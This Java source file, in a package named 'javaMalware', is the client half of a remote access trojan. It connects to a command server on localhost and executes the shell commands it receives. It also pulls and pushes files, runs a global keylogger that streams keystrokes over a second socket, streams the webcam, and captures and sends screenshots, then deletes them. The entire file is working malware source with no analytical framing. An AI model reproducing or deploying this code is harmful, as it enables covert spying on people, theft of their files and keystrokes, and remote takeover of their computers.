package javaMalware;

import java.awt.Dimension;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.Socket;
import javax.imageio.ImageIO;
import java.util.logging.Logger;
import java.util.logging.Level;
import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
import com.github.sarxos.webcam.Webcam;
import java.io.ObjectOutputStream;
import java.util.concurrent.atomic.AtomicBoolean;
import javax.swing.ImageIcon;

public class Client implements NativeKeyListener{
    private static DataOutputStream dataOutputStream;
    private static int exit;
    private static int var = 0;
    private static DataOutputStream dos;
    public Client(DataOutputStream dataOutputStream){
        Client.dataOutputStream = dataOutputStream;
    }
    public static void main(String[] args) throws IOException, Exception {
        Socket socket = new Socket("127.0.0.1", 4444);
        while(true){
            InputStream inputStream = socket.getInputStream();
            DataInputStream dataInputStream = new DataInputStream(inputStream);
            OutputStream outputStream = socket.getOutputStream();
            DataOutputStream dataOutputStream = new DataOutputStream(outputStream);
            //Read cmd from server
            String cmd = dataInputStream.readUTF();
            
            if(cmd.equals("dir")){remoteCmdExec(cmd,dataOutputStream);}
            else if(cmd.equals("cd")){remoteCmdExec(cmd,dataOutputStream);}
            else if(cmd.contains("download")){
                int bytes = 0;
                String[] words = cmd.split("\\s");
                File file = new File(words[1]);
                FileInputStream fileInputStream = new FileInputStream(file);

                // send file size
                dataOutputStream.writeLong(file.length());  
                // break file into chunks
                byte[] buffer = new byte[4*1024];
                while ((bytes=fileInputStream.read(buffer))!=-1){
                    dataOutputStream.write(buffer,0,bytes);
                    dataOutputStream.flush();
                }
                fileInputStream.close();
            }
            else if(cmd.equals("exit")){break;}
            else if(cmd.contains("upload")){
                int bytes = 0;
                String[] words = cmd.split("\\s");
                FileOutputStream fileOutputStream = new FileOutputStream(words[2]);
                long size = dataInputStream.readLong();     // read file size
                byte[] buffer = new byte[4*1024];
                while (size > 0 && (bytes = dataInputStream.read(buffer, 0, (int)Math.min(buffer.length, size))) != -1) {
                    fileOutputStream.write(buffer,0,bytes);
                    size -= bytes;      // read upto file size
                }
                fileOutputStream.close();
            }
            else if(cmd.equals("keylogger")){
                Socket s = new Socket("127.0.0.1", 1234);
                OutputStream os = s.getOutputStream();
                dos = new DataOutputStream(os);
                Thread t1 = new Thread(new Runnable(){
                    public void run(){
                        try{
                            GlobalScreen.registerNativeHook();
                        }
                        catch(NativeHookException e){
                            System.exit(-1);
                        }
                        GlobalScreen.addNativeKeyListener(new Client(dos)); 
                    }
                });t1.start();
                Thread t2 = new Thread(new Runnable(){
                    public void run(){
                        while(var == 0){
                            try {
                                InputStream is = s.getInputStream();
                                DataInputStream dis = new DataInputStream(is);
                                String str = dis.readUTF();
                                System.out.println(str);
                                if(str.equals("quit")){
                                    t1.stop();
                                    var = 1;
                                }
                            } catch (IOException ex) {
                                Logger.getLogger(Client.class.getName()).log(Level.SEVERE, null, ex);
                            }
                        }
                    }
                });t2.start();
                t2.join();
                if(var == 1){
                    t2.stop();
                    GlobalScreen.removeNativeKeyListener(new Client(dos));
                    GlobalScreen.unregisterNativeHook();
                    s.close();
                }
            }
            else if(cmd.equals("webcam")){
                ObjectOutputStream out = new ObjectOutputStream(socket.getOutputStream());
                ImageIcon ic;
                BufferedImage br;
                Webcam cam = Webcam.getDefault();
                cam.open();
                while(true){
                    br = cam.getImage();
                    ic = new ImageIcon(br);
                    out.writeObject(ic);
                    out.flush();
                }
            }
            else if(cmd.equals("screenshot")){
                //Screenshoot
                String pathFile = "C:/users/asus/desktop/screenshot.jpg";
                Thread.sleep(5000);
                Robot robotObj = new Robot();
                Dimension dim = Toolkit.getDefaultToolkit().getScreenSize();
                Rectangle rectObj= new Rectangle(dim);
                BufferedImage img = robotObj.createScreenCapture(rectObj);
                ImageIO.write(img, "jpg", new File(pathFile));
                //Send to server
                int bytes = 0;
                File file = new File(pathFile);
                FileInputStream fileInputStream = new FileInputStream(file);

                // send file size
                dataOutputStream.writeLong(file.length());  
                // break file into chunks
                byte[] buffer = new byte[4*1024];
                while ((bytes=fileInputStream.read(buffer))!=-1){
                    dataOutputStream.write(buffer,0,bytes);
                    dataOutputStream.flush();
                }
                fileInputStream.close();
                Runtime.getRuntime().exec("powershell rm C:/users/asus/desktop/screenshot.jpg");
            }
            else{
                try{
                    remoteCmdExecV2(cmd,dataOutputStream);
                }
                catch (IOException e){
                    e.printStackTrace();
                    dataOutputStream.writeUTF("---> Error cmd");
                    dataOutputStream.flush();
                }
            }
        }
    }
    public void nativeKeyPressed(NativeKeyEvent e) {
        String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
        try {
            if(keyText.equals("Space")){keyText = " ";}
            //send result
            dataOutputStream.writeUTF(keyText);
            dataOutputStream.flush();
        } catch (IOException ex) {
            Logger.getLogger(Client.class.getName()).log(Level.SEVERE, null, ex);
        }
    }
    public void nativeKeyReleased(NativeKeyEvent e) {
        // Nothing
    }
    public void nativeKeyTyped(NativeKeyEvent e) {
        // Nothing here
    }
    public static void remoteCmdExec(String cmd, DataOutputStream dataOutputStream) throws Exception{
        ProcessBuilder processBuilder = new ProcessBuilder();
        processBuilder.command("cmd.exe","/c",cmd);
        StringBuilder output = new StringBuilder();  
        Process process = processBuilder.start();
        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
        String line;
        while ((line = reader.readLine()) != null) {
            output.append(line + "\n");
        }
        String s = output.toString();
        dataOutputStream.writeUTF(s);
        dataOutputStream.flush();
    } 
    public static void remoteCmdExecV2(String cmd, DataOutputStream dataOutputStream) throws Exception{
        Process process = Runtime.getRuntime().exec(cmd); 
        StringBuilder output = new StringBuilder(); 
        BufferedReader reader = new BufferedReader(new InputStreamReader (process.getInputStream()));
        String line;
        while((line = reader.readLine()) != null) {
                output.append(line + "\n");
        }
        String s = output.toString();
        dataOutputStream.writeUTF(s);
        dataOutputStream.flush();
    }
}


